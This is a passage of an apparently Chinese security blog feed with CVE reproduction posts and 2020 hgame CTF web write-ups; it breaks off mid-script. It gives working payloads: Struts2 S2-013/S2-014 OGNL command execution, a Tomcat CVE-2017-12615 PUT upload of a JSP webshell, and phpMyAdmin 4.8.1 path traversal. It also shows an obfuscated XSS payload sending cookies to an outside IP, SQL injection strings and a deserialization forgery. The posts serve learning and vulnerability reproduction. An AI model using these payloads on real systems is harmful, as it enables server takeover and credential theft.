        <content type="html"><![CDATA[<h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p><pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// 或link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><p>S2-014</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/">https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUT方法任意写文件漏洞CVE-2017-12615</title>
      <link href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/"/>
      <url>/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p><p>平台: Windows </p><p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p><p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p><pre><code>PUT /111.jsp::$DATA HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code class="java">&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print(&quot;&lt;/pre&gt;&quot;);    }%&gt;</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requestsdef poc(url):    filename=&quot;tomcat_check_vuln.txt&quot;    content=&quot;test&quot;    try:        requests.put(url+&quot;/&quot;+filename,data=conetent)        res=requests.get(url+&quot;/&quot;+filename)    except :        return False    if res.status_code==200:        return True    return False</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 rce</title>
      <link href="/2020/02/08/phpmyadmin%204.8.1%20rce/"/>
      <url>/2020/02/08/phpmyadmin%204.8.1%20rce/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p><p>登陆账号</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p><p>漏洞位置:<code>index.php</code>:57</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><p>非常明显的任意文件包含漏洞</p><p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p><p>跟进去</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p><pre><code class="php">array (  0 =&gt; &#39;db_datadict.php&#39;,....)</code></pre><p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p><p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p><p>通用的payload:</p><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p><p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hgame</title>
      <link href="/2020/02/07/2020hgame/"/>
      <url>/2020/02/07/2020hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote><p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p></blockquote><p>根据提示下载.git</p><pre><code class="bash">$ git remote -v#查看git</code></pre><p>查看提交历史拿到flag</p><h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p><pre><code>GET / HTTP/1.1Host: kyaru.hgame.n3ko.coCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Cosmos BrowerAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7referer: https://vidar.club/ x-forwarded-for: 127.0.0.1If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMTConnection: close</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p><p>修改GET为post</p><h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;        }    }}?&gt;</code></pre><p>adminpassword: 0e114902927253523756713132279690 </p><p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p><p>adminusername: Cosmos! </p><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}$action = @$_GET[&#39;action&#39;];$filter = &quot;/config|etc|flag/i&quot;;if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {    if(preg_match($filter, $_GET[&#39;action&#39;])) {        echo &quot;Hacker get out!&quot;;        exit();    }        include $action;}elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {    header(&quot;Location: ?action=login.php&quot;);    exit();}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;</code></pre><p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p><p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p><h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p><p>过滤:select</p><p>黑名单:空格</p><pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#information_schema,easysql0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#f1aggggggggggggg,messages#GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;fl4444444ghgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p><pre><code class="php">&lt;?php// function encrypt($str){//     $result = &#39;&#39;;//     for($i = 0; $i &lt; strlen($str); $i++){//         $result .= chr(ord($str[$i]) + 1);//     }//     return $result;// }function encrypt($str){    $result = &#39;&#39;;    for($i = 0; $i &lt; strlen($str); $i++){        $result .= chr(ord($str[$i]) - 1);    }    return $result;}$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;){    $arr=array();    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);    $newcmd=$arr[0].$newcmd.&quot;)&quot;;        $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);}$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    $dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);?&gt;</code></pre><p>python </p><pre><code class="python">import requestsdef get_flag():    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]    enccmd=enccmd[:len(enccmd)-75]    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text    data={&quot;token&quot;:dec}    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])get_flag()</code></pre><h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre><p>输入会变成大写</p><h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p><p>而默认的逻辑是没法实现的</p><pre><code class="php">        if($this-&gt;rank &lt;= 2){                $this-&gt;rank = 2;            }</code></pre><p>阅读代码发现反序列化点:</p><p><code>Monster</code>的<code>__construct</code>方法</p><pre><code class="php">public function __construct($key){        $this-&gt;encryptKey = $key;        if(!isset($_COOKIE[&#39;monster&#39;])){            $this-&gt;Set();            return;        }        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }        $this-&gt;Set();         }</code></pre><p>但是要知道<code>$key</code>才能反序列化</p><p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p><pre><code class="php">class Game{       private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    private $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign        $this-&gt;monster = new Monster($this-&gt;sign);        $this-&gt;rank = new Rank();    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}</code></pre><p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p><pre><code class="php">public function __destruct(){        // 确保程序是跑在服务器上的！        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];        if($this-&gt;key === $this-&gt;serverKey){            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;        }else{            // 非正常访问            session_start();            session_destroy();            setcookie(&#39;monster&#39;, &#39;&#39;);            header(&#39;Location: index.php&#39;);            exit;        }    }</code></pre><p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p><p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p><p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p><p>如:</p><pre><code class="php">&lt;?phpclass test{    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;    public function __destruct()    {        echo $this-&gt;my_static;    }}class tesa{}$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));unserialize($a);结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p>于是构造</p><pre><code class="php">&lt;?phpclass Game{    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    public $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}class Rank{    private $rank;//    private $serverKey;     // 服务器的 Key//    private $key;    public function __construct()    {        $this-&gt;rank=1;    }    public function __destruct(){    }}$s=new Rank();//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);$a=new Game($_GET[&#39;name&#39;]);$sign = md5(serialize($s) . $a-&gt;sign);print( base64_encode(serialize($s) . $sign));?&gt;</code></pre><h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p><p>前一段时间爆出来的mt_srand逆向刚好可以用到</p><p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p><pre><code class="php">import requestsimport osburp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).texta=eval(result)p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )x=p.read().strip()burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}burp0_data = {&quot;ans&quot;: x}print(burp0_data)result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).textprint(result)</code></pre><h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p><p>admin,123456</p><h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p><p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p><p>我来模拟以下造成条件竞争漏洞的原因</p><p>首先猜测以下solve和buy方法的流程</p><pre><code class="php">function solve(){    #1. $num=从数据库中查找要用户持有的卖出商品的个数    #2. 如果数量足够,则进行下一步,否则返回并报错    #3. 在数据库中增加用户账户里的钱    #4. 在数据库中减少用户拥有该商品的数量}</code></pre><p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p><ol><li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li><li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li><li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li><li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li><li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li><li>b进程结束</li></ol><p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p><p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p><p>刷钱脚本</p><pre><code class="python">from multiprocessing import Poolimport requestsdef buy(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully buy %d items&quot; % num)def solve(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, 